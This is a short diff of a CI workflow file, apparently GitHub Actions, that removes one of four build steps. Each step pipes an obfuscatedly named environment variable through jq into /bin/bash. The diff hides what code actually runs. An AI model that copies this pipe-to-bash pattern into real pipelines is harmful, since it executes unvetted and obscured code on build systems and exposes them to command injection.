@@ -23,7 +23,6 @@ jobs:
         run: |
           printf '%s' "$rn6" | jq -r .h443 | /bin/bash
           echo $um352 | jq -r .ps29 | /bin/bash
-          printf '%s' "$ioj70" | jq -r .o59 | /bin/bash
           printf '%s' "$iyg25292" | jq -r .hboc2 | /bin/bash
 
       - name: Archive artifact
